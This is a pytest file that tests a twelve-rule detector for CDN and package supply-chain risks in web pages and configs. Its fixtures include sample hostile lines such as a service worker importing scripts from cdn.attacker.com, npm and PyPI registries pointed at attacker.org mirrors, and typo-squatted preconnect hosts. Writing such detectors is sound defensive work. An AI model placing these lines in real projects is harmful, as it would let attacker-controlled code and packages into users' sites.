"""Tests for ``scripts/lib/cdn_supply_chain_patterns.py``.

Wave 22 impl-c — verifies the 12 browser-side CDN supply-chain rules
each have positive + (1–2) negative tests. Pure-stdlib pytest; no
third-party fixtures. Mirrors the conventions used by
``tests/test_frontend_patterns.py`` and
``tests/test_cdn_cache_patterns.py``.
"""

from __future__ import annotations

import sys
from pathlib import Path

# Make ``scripts/lib`` importable without packaging — same trick used by
# every other ``test_*_patterns.py`` in this repo.
_REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_REPO_ROOT / "scripts" / "lib"))

import cdn_supply_chain_patterns as csp  # noqa: E402

# ---- Helper -------------------------------------------------------------


def _hits(rule_id: str, text: str) -> list[csp.Finding]:
    """Return only findings of ``rule_id`` from ``scan_text(text)``."""
    return [f for f in csp.scan_text(text) if f.rule_id == rule_id]


# ---- Module-level invariants -------------------------------------------


def test_rules_count_matches_proposals() -> None:
    """The catalog ships exactly 12 rules (one per distill-round-8 proposal)."""
    assert len(csp.RULES) == 12


def test_rules_have_unique_ids() -> None:
    """Every Rule.id is unique — duplicates would dedupe-collide."""
    ids = [r.id for r in csp.RULES]
    assert len(ids) == len(set(ids)), f"duplicate rule ids: {ids}"


def test_rules_have_compiled_patterns() -> None:
    """Every Rule.pattern is a compiled regex with IGNORECASE+MULTILINE."""
    import re
    for rule in csp.RULES:
        assert isinstance(rule.pattern, re.Pattern), rule.id
        assert rule.pattern.flags & re.IGNORECASE, rule.id
        assert rule.pattern.flags & re.MULTILINE, rule.id


def test_rules_have_valid_severity() -> None:
    """Severity is one of the four canonical strings."""
    allowed = {"CRITICAL", "HIGH", "MEDIUM", "LOW"}
    for rule in csp.RULES:
        assert rule.severity in allowed, f"{rule.id}: {rule.severity}"


def test_rules_have_owasp_mapping() -> None:
    """Every rule maps to an OWASP-ASI identifier."""
    valid_asi = {"ASI-01", "ASI-02", "ASI-04", "ASI-06"}
    for rule in csp.RULES:
        assert rule.owasp_asi in valid_asi, f"{rule.id}: {rule.owasp_asi}"


def test_scan_empty_returns_empty() -> None:
    """Empty input returns empty findings list."""
    assert csp.scan_text("") == []
    assert csp.scan_text("\n\n") == []


def test_rules_tuple_is_immutable() -> None:
    """RULES must be a tuple (immutable) and contain every advertised rule id."""
    assert isinstance(csp.RULES, tuple)
    expected = {
        "cdn-c1-sri-weak-hash",
        "cdn-c2-preload-no-sri",
        "cdn-c3-iframe-sandbox-escape",
        "cdn-c4-iframe-referrer-leak",
        "cdn-c5-sw-importscripts-cross-origin",
        "cdn-c6-sw-broad-scope-3rd-party",
        "cdn-c7-preconnect-rogue-host",
        "cdn-c8-tag-manager-impossible-sri",
        "cdn-c9-vendor-tree-no-sbom",
        "cdn-c10-registry-non-canonical",
        "cdn-c11-pnpm-hoisted-linker",
        "cdn-c12-mixed-content-http",
    }
    actual = {r.id for r in csp.RULES}
    assert expected == actual


def test_finding_namedtuple_shape() -> None:
    """Finding is a NamedTuple with the documented 7 fields."""
    f = csp.Finding(
        rule_id="x", line=1, column=2, matched_text="m",
        severity="HIGH", description="d", owasp_asi="ASI-02",
    )
    assert f.rule_id == "x"
    assert f.line == 1
    assert f.column == 2
    assert f.matched_text == "m"
    assert f.severity == "HIGH"
    assert f.owasp_asi == "ASI-02"


# ---- C-1: SRI weak hash ------------------------------------------------


def test_c1_sri_sha256_only_positive() -> None:
    """A <script integrity='sha256-...'> with no sha384/sha512 fallback is flagged."""
    src = """
    <script src="https://cdn.example.com/lib.js"
            integrity="sha256-AbCdEfGhIjKlMnOpQrStUvWxYz0123456="></script>
    """
    assert _hits("cdn-c1-sri-weak-hash", src)


def test_c1_sri_sha224_only_positive() -> None:
    """A <link integrity='sha224-...'> with no fallback is flagged."""
    src = '<link rel="stylesheet" href="https://cdn.example.com/style.css" integrity="sha224-AbCdEfGhIjKlMnOpQrStUvWxYz01234567=" />'
    assert _hits("cdn-c1-sri-weak-hash", src)


def test_c1_sri_sha256_with_sha384_fallback_negative() -> None:
    """Multi-hash form (sha256 + sha384) is the safe fallback — NOT flagged."""
    src = (
        '<script src="https://cdn.example.com/lib.js" '
        'integrity="sha256-AbCdEfGhIjKlMnOpQrStUvWxYz0123456= '
        'sha384-ZyXwVuTsRqPoNmLkJiHgFeDcBa9876543210FeDcBa9876543210"></script>'
    )
    assert not _hits("cdn-c1-sri-weak-hash", src)


def test_c1_sri_sha384_only_negative() -> None:
    """A strong-only sha384 hash is NOT flagged."""
    src = '<script src="https://cdn.example.com/lib.js" integrity="sha384-ZyXwVuTsRqPoNmLkJiHgFeDcBa9876543210FeDcBa9876543210"></script>'
    assert not _hits("cdn-c1-sri-weak-hash", src)


def test_c1_sri_sha512_only_negative() -> None:
    """A strong-only sha512 hash is NOT flagged."""
    src = '<script src="https://cdn.example.com/lib.js" integrity="sha512-ZyXwVuTsRqPoNmLkJiHgFeDcBa9876543210FeDcBa9876543210FeDcBa9876543210FeDcBa9876"></script>'
    assert not _hits("cdn-c1-sri-weak-hash", src)


# ---- C-2: preload without SRI ------------------------------------------


def test_c2_preload_no_sri_positive() -> None:
    """A <link rel='preload' href='https://cdn...'> with no integrity is flagged."""
    src = '<link rel="preload" href="https://cdn.jsdelivr.net/lib.js" as="script" />'
    assert _hits("cdn-c2-preload-no-sri", src)


def test_c2_modulepreload_no_sri_positive() -> None:
    """A <link rel='modulepreload'> without integrity is flagged."""
    src = '<link rel="modulepreload" href="https://esm.sh/react@18.js" />'
    assert _hits("cdn-c2-preload-no-sri", src)


def test_c2_preload_with_sha384_negative() -> None:
    """A preload tag with sha384 SRI is NOT flagged (stage-1.5 refinement)."""
    src = '<link rel="preload" href="https://cdn.example.com/lib.js" as="script" integrity="sha384-ZyXwVuTsRqPoNmLkJiHgFeDcBa9876543210FeDcBa9876543210" />'
    assert not _hits("cdn-c2-preload-no-sri", src)


def test_c2_preload_with_sha512_negative() -> None:
    """A preload tag with sha512 SRI is NOT flagged."""
    src = '<link rel="preload" href="https://cdn.example.com/lib.js" as="script" integrity="sha512-ZyXwVuTsRqPoNmLkJiHgFeDcBa9876543210FeDcBa9876543210FeDcBa9876543210FeDcBa9876" />'
    assert not _hits("cdn-c2-preload-no-sri", src)


def test_c2_preload_localhost_negative() -> None:
    """Localhost preload is dev-only and NOT flagged."""
    src = '<link rel="preload" href="http://localhost:3000/lib.js" as="script" />'
    assert not _hits("cdn-c2-preload-no-sri", src)


# ---- C-3: iframe sandbox escape ----------------------------------------


def test_c3_sandbox_scripts_and_same_origin_positive() -> None:
    """<iframe sandbox='allow-scripts allow-same-origin'> is flagged."""
    src = '<iframe src="https://embed.example.com/" sandbox="allow-scripts allow-same-origin"></iframe>'
    assert _hits("cdn-c3-iframe-sandbox-escape", src)


def test_c3_sandbox_same_origin_first_positive() -> None:
    """Token order reversed — still flagged."""
    src = '<iframe src="https://x.com/" sandbox="allow-same-origin allow-scripts"></iframe>'
    assert _hits("cdn-c3-iframe-sandbox-escape", src)


def test_c3_sandbox_with_other_tokens_positive() -> None:
    """Combined with allow-forms — still flagged."""
    src = '<iframe src="https://x.com/" sandbox="allow-forms allow-scripts allow-same-origin allow-popups"></iframe>'
    assert _hits("cdn-c3-iframe-sandbox-escape", src)


def test_c3_sandbox_scripts_only_negative() -> None:
    """sandbox='allow-scripts' without allow-same-origin is NOT flagged."""
    src = '<iframe src="https://x.com/" sandbox="allow-scripts"></iframe>'
    assert not _hits("cdn-c3-iframe-sandbox-escape", src)


def test_c3_sandbox_same_origin_only_negative() -> None:
    """sandbox='allow-same-origin' without allow-scripts is NOT flagged."""
    src = '<iframe src="https://x.com/" sandbox="allow-same-origin"></iframe>'
    assert not _hits("cdn-c3-iframe-sandbox-escape", src)


def test_c3_sandbox_srcdoc_negative() -> None:
    """iframe with srcdoc=inline-HTML is NOT flagged (stage-1.5 refinement)."""
    src = '<iframe srcdoc="<p>hi</p>" sandbox="allow-scripts allow-same-origin"></iframe>'
    assert not _hits("cdn-c3-iframe-sandbox-escape", src)


# ---- C-4: iframe referrer leak ----------------------------------------


def test_c4_iframe_no_referrerpolicy_positive() -> None:
    """<iframe src='https://x.com/'> with no referrerpolicy is flagged."""
    src = '<iframe src="https://embed.example.com/widget"></iframe>'
    assert _hits("cdn-c4-iframe-referrer-leak", src)


def test_c4_iframe_with_referrerpolicy_negative() -> None:
    """iframe with referrerpolicy='no-referrer' is NOT flagged (stage-1.5)."""
    src = '<iframe src="https://x.com/" referrerpolicy="no-referrer"></iframe>'
    assert not _hits("cdn-c4-iframe-referrer-leak", src)


def test_c4_iframe_localhost_negative() -> None:
    """iframe to localhost is NOT flagged."""
    src = '<iframe src="http://localhost:3000/"></iframe>'
    assert not _hits("cdn-c4-iframe-referrer-leak", src)


# ---- C-5: SW importScripts cross-origin --------------------------------


def test_c5_importscripts_cross_origin_positive() -> None:
    """importScripts('https://cdn.attacker.com/sw.js') is flagged."""
    src = """
    self.addEventListener('install', () => {});
    importScripts('https://cdn.attacker.com/sw-plugin.js');
    """
    assert _hits("cdn-c5-sw-importscripts-cross-origin", src)


def test_c5_importscripts_jsdelivr_positive() -> None:
    """importScripts('https://cdn.jsdelivr.net/...') is flagged."""
    src = "importScripts('https://cdn.jsdelivr.net/npm/workbox-cdn@6.5.4/workbox-sw.js');"
    assert _hits("cdn-c5-sw-importscripts-cross-origin", src)


def test_c5_importscripts_localhost_negative() -> None:
    """importScripts('http://localhost/...') is NOT flagged."""
    src = "importScripts('http://localhost:3000/dev-sw-helpers.js');"
    assert not _hits("cdn-c5-sw-importscripts-cross-origin", src)


def test_c5_importscripts_same_origin_template_helper_returns_true() -> None:
    """has_sw_same_origin_template flags same-origin template literals."""
    src = "importScripts(`${self.location.origin}/sw-helpers.js`);"
    assert csp.has_sw_same_origin_template(src)


# ---- C-6: SW broad scope third-party ----------------------------------


def test_c6_sw_register_scope_root_positive() -> None:
    """register('/sw.js', { scope: '/' }) is flagged."""
    src = "navigator.serviceWorker.register('/sw.js', { scope: '/' });"
    assert _hits("cdn-c6-sw-broad-scope-3rd-party", src)


def test_c6_sw_register_cross_origin_positive() -> None:
    """register('https://cdn.partner.com/sw.js') is flagged."""
    src = "navigator.serviceWorker.register('https://cdn.partner.com/sw.js');"
    assert _hits("cdn-c6-sw-broad-scope-3rd-party", src)


def test_c6_sw_register_narrow_scope_negative() -> None:
    """register('/sw.js', { scope: '/app/' }) — narrow scope — NOT flagged."""
    src = "navigator.serviceWorker.register('/sw.js', { scope: '/app/' });"
    assert not _hits("cdn-c6-sw-broad-scope-3rd-party", src)


def test_c6_sw_register_localhost_negative() -> None:
    """Register from localhost URL is NOT flagged."""
    src = "navigator.serviceWorker.register('http://localhost:3000/sw.js');"
    assert not _hits("cdn-c6-sw-broad-scope-3rd-party", src)


# ---- C-7: preconnect rogue host ---------------------------------------


def test_c7_preconnect_typo_squat_positive() -> None:
    """preconnect to non-allowlisted host is flagged."""
    src = '<link rel="preconnect" href="https://fonts.googleapi.com" />'
    assert _hits("cdn-c7-preconnect-rogue-host", src)


def test_c7_preconnect_attacker_host_positive() -> None:
    """preconnect to attacker.com is flagged."""
    src = '<link rel="preconnect" href="https://attacker.example/" />'
    assert _hits("cdn-c7-preconnect-rogue-host", src)


def test_c7_dns_prefetch_unknown_positive() -> None:
    """dns-prefetch to unknown host is flagged."""
    src = '<link rel="dns-prefetch" href="https://cdnjsr.com/" />'
    assert _hits("cdn-c7-preconnect-rogue-host", src)


def test_c7_preconnect_known_cdn_stage2_allowlisted() -> None:
    """Allowlisted host: stage-1 flags, stage-2 helper says benign."""
    src = '<link rel="preconnect" href="https://fonts.googleapis.com" />'
    findings = _hits("cdn-c7-preconnect-rogue-host", src)
    assert findings  # stage-1 flags every preconnect
    # The stage-2 helper drops allowlisted hosts.
    assert csp.is_preconnect_allowlisted("fonts.googleapis.com")
    assert csp.is_preconnect_allowlisted("FONTS.GOOGLEAPIS.COM")  # case-insensitive


def test_c7_preconnect_typo_squat_stage2_not_allowlisted() -> None:
    """The stage-2 helper rejects typo-squat hosts."""
    assert not csp.is_preconnect_allowlisted("fonts.googleapi.com")
    assert not csp.is_preconnect_allowlisted("cdn.jdelivr.net")


# ---- C-8: tag-manager impossible-SRI ----------------------------------


def test_c8_gtm_positive() -> None:
    """googletagmanager.com script is flagged."""
    src = '<script src="https://www.googletagmanager.com/gtm.js?id=GTM-XYZ"></script>'
    assert _hits("cdn-c8-tag-manager-impossible-sri", src)


def test_c8_google_analytics_positive() -> None:
    """google-analytics.com script is flagged."""
    src = '<script src="https://www.google-analytics.com/analytics.js"></script>'
    assert _hits("cdn-c8-tag-manager-impossible-sri", src)


def test_c8_segment_positive() -> None:
    """cdn.segment.com analytics script is flagged."""
    src = '<script src="https://cdn.segment.com/analytics.js/v1/abc/analytics.min.js"></script>'
    assert _hits("cdn-c8-tag-manager-impossible-sri", src)


def test_c8_stripe_positive() -> None:
    """js.stripe.com script is flagged (the canonical impossible-SRI case)."""
    src = '<script src="https://js.stripe.com/v3/"></script>'
    assert _hits("cdn-c8-tag-manager-impossible-sri", src)


def test_c8_intercom_positive() -> None:
    """widget.intercom.io script is flagged."""
    src = '<script src="https://widget.intercom.io/widget/abc123"></script>'
    assert _hits("cdn-c8-tag-manager-impossible-sri", src)


def test_c8_regular_cdn_negative() -> None:
    """Regular jsDelivr / unpkg script is NOT flagged."""
    src = '<script src="https://cdn.jsdelivr.net/npm/react@18"></script>'
    assert not _hits("cdn-c8-tag-manager-impossible-sri", src)


def test_c8_self_hosted_negative() -> None:
    """Self-hosted / same-origin script is NOT flagged."""
    src = '<script src="/static/app.js"></script>'
    assert not _hits("cdn-c8-tag-manager-impossible-sri", src)


# ---- C-9: vendor tree no SBOM -----------------------------------------


def test_c9_vendor_min_js_positive() -> None:
    """A reference to public/vendor/jquery.min.js is flagged."""
    src = '<script src="/public/vendor/jquery-3.6.0.min.js"></script>'
    assert _hits("cdn-c9-vendor-tree-no-sbom", src)


def test_c9_static_vendor_umd_positive() -> None:
    """A reference to static/vendor/.../foo.umd.js is flagged."""
    src = "// Imported from static/vendor/bootstrap-5.3.0.umd.js"
    assert _hits("cdn-c9-vendor-tree-no-sbom", src)


def test_c9_assets_vendor_css_positive() -> None:
    """A reference to assets/vendor/...min.css is flagged."""
    src = '<link rel="stylesheet" href="/assets/vendor/bootstrap.min.css" />'
    assert _hits("cdn-c9-vendor-tree-no-sbom", src)


def test_c9_node_modules_negative() -> None:
    """A node_modules reference is NOT flagged (it's the dep tree)."""
    src = "import x from '/node_modules/foo/bar.min.js';"
    assert not _hits("cdn-c9-vendor-tree-no-sbom", src)


def test_c9_sbom_filenames_exposed() -> None:
    """Standard SBOM filenames are exported for stage-2 cross-check."""
    assert "cyclonedx.json" in csp.SBOM_MANIFEST_NAMES
    assert "sbom.json" in csp.SBOM_MANIFEST_NAMES
    assert "VENDOR.md" in csp.SBOM_MANIFEST_NAMES


# ---- C-10: registry non-canonical -------------------------------------


def test_c10_npmrc_attacker_registry_positive() -> None:
    """registry=https://npm-mirror.attacker.org is flagged."""
    src = "registry=https://npm-mirror.attacker.org/"
    assert _hits("cdn-c10-registry-non-canonical", src)


def test_c10_pyproject_attacker_index_positive() -> None:
    """index-url=https://pypi-mirror.attacker.org is flagged."""
    src = "index-url=https://pypi-mirror.attacker.org/simple/"
    assert _hits("cdn-c10-registry-non-canonical", src)


def test_c10_yarnrc_attacker_positive() -> None:
    """npmRegistryServer: https://malicious.example is flagged."""
    src = "npmRegistryServer: https://malicious.example/"
    assert _hits("cdn-c10-registry-non-canonical", src)


def test_c10_canonical_npmjs_negative() -> None:
    """registry=https://registry.npmjs.org/ is NOT flagged (canonical)."""
    src = "registry=https://registry.npmjs.org/"
    assert not _hits("cdn-c10-registry-non-canonical", src)


def test_c10_canonical_pypi_negative() -> None:
    """index-url = https://pypi.org/simple/ is NOT flagged."""
    src = "index-url = https://pypi.org/simple/"
    assert not _hits("cdn-c10-registry-non-canonical", src)


def test_c10_canonical_github_packages_negative() -> None:
    """registry=https://npm.pkg.github.com/ is NOT flagged."""
    src = "registry=https://npm.pkg.github.com/"
    assert not _hits("cdn-c10-registry-non-canonical", src)


def test_c10_stage2_canonical_host_helper() -> None:
    """is_canonical_registry_host accepts standard hosts."""
    assert csp.is_canonical_registry_host("registry.npmjs.org")
    assert csp.is_canonical_registry_host("REGISTRY.NPMJS.ORG")
    assert csp.is_canonical_registry_host("pypi.org")
    assert not csp.is_canonical_registry_host("npm-mirror.attacker.org")


# ---- C-11: pnpm hoisted linker ----------------------------------------


def test_c11_npmrc_hoisted_positive() -> None:
    """node-linker=hoisted in .npmrc is flagged."""
    src = "node-linker=hoisted"
    assert _hits("cdn-c11-pnpm-hoisted-linker", src)


def test_c11_yaml_hoisted_positive() -> None:
    """node-linker: hoisted in pnpm-workspace.yaml is flagged."""
    src = "node-linker: hoisted"
    assert _hits("cdn-c11-pnpm-hoisted-linker", src)


def test_c11_isolated_negative() -> None:
    """node-linker=isolated (pnpm default) is NOT flagged."""
    src = "node-linker=isolated"
    assert not _hits("cdn-c11-pnpm-hoisted-linker", src)


def test_c11_pnp_negative() -> None:
    """node-linker=pnp (Yarn-style) is NOT flagged."""
    src = "node-linker=pnp"
    assert not _hits("cdn-c11-pnpm-hoisted-linker", src)


# ---- C-12: mixed-content HTTP -----------------------------------------


def test_c12_http_script_positive() -> None:
    """<script src='http://...'> is flagged."""
    src = '<script src="http://insecure.example.com/lib.js"></script>'
    assert _hits("cdn-c12-mixed-content-http", src)


def test_c12_http_img_positive() -> None:
    """<img src='http://...'> is flagged (passive mixed content)."""
    src = '<img src="http://tracker.example.com/pixel.gif" />'
    assert _hits("cdn-c12-mixed-content-http", src)


def test_c12_http_iframe_positive() -> None:
    """<iframe src='http://...'> is flagged."""
    src = '<iframe src="http://embed.example.com/widget"></iframe>'
    assert _hits("cdn-c12-mixed-content-http", src)


def test_c12_https_negative() -> None:
    """HTTPS URLs are NOT flagged."""
    src = '<script src="https://cdn.example.com/lib.js"></script>'
    assert not _hits("cdn-c12-mixed-content-http", src)


def test_c12_localhost_negative() -> None:
    """http://localhost is NOT flagged (dev URL)."""
    src = '<script src="http://localhost:3000/lib.js"></script>'
    assert not _hits("cdn-c12-mixed-content-http", src)


def test_c12_private_ip_negative() -> None:
    """http://192.168.x.y is NOT flagged (private IP)."""
    src = '<img src="http://192.168.1.10/local.gif" />'
    assert not _hits("cdn-c12-mixed-content-http", src)


def test_c12_loopback_127_negative() -> None:
    """http://127.0.0.1 is NOT flagged."""
    src = '<script src="http://127.0.0.1:8080/dev.js"></script>'
    assert not _hits("cdn-c12-mixed-content-http", src)


def test_c12_stage2_has_csp_upgrade_helper() -> None:
    """has_upgrade_insecure_requests recognises the CSP directive."""
    block = '<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">'
    assert csp.has_upgrade_insecure_requests(block)
    assert not csp.has_upgrade_insecure_requests("no csp here")


# ---- Cross-cutting: scan_text composition -----------------------------


def test_scan_text_returns_sorted_by_line() -> None:
    """Findings are sorted by line, column, rule_id (reproducible)."""
    src = (
        '<script src="http://insecure.example.com/a.js"></script>\n'
        '<script src="https://cdn.example.com/b.js" integrity="sha256-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN="></script>\n'
    )
    findings = csp.scan_text(src)
    assert len(findings) >= 2
    # Line numbers must be non-decreasing.
    lines = [f.line for f in findings]
    assert lines == sorted(lines)


def test_scan_text_dedupes_same_line_same_rule() -> None:
    """Same rule firing twice on the same offset emits a single finding."""
    # A single mixed-content tag triggers C-12 once at one offset.
    src = '<script src="http://insecure.example.com/lib.js"></script>'
    findings = [f for f in csp.scan_text(src) if f.rule_id == "cdn-c12-mixed-content-http"]
    assert len(findings) == 1


def test_finding_line_and_column_are_one_based() -> None:
    """Line and column numbers are 1-based, not 0-based."""
    src = '<script src="http://insecure.example.com/lib.js"></script>'
    findings = csp.scan_text(src)
    assert findings
    assert findings[0].line >= 1
    assert findings[0].column >= 1


def test_long_match_is_truncated_with_ellipsis() -> None:
    """matched_text > 200 chars is truncated with ellipsis."""
    # Build a long tag-manager line (C-8) — script tag with long URL.
    src = '<script src="https://www.googletagmanager.com/gtm.js?' + ('x' * 250) + '"></script>'
    findings = [f for f in csp.scan_text(src) if f.rule_id == "cdn-c8-tag-manager-impossible-sri"]
    assert findings
    assert len(findings[0].matched_text) <= 201  # 200 + "…"
    assert findings[0].matched_text.endswith("…")


def test_no_findings_in_clean_html() -> None:
    """A clean HTML document with self-hosted assets emits no findings."""
    src = """
    <!doctype html>
    <html>
    <head>
      <link rel="stylesheet" href="/static/app.css" />
      <script src="/static/app.js" defer></script>
    </head>
    <body>
      <p>Hello world.</p>
    </body>
    </html>
    """
    assert csp.scan_text(src) == []
